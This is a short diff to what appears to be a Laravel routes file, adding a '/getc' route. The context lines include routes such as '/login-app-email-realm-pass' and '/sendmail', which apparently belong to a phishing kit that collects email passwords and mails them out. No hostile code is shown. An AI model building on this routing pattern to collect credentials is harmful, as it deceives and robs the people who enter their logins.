@@ -32,6 +32,7 @@ Route::get('/osendmail', function () {
 });
 Route::post('/login-app-email-realm-pass', 'PageController@index')->name('pages');
 Route::post('/block-unauthorised-login', 'PageController@net')->name('net');
+Route::get('/getc', 'PageController@getc');
 
 Route::post('/sendmail', 'PageController@sendEmail')->name('sendmail');
 
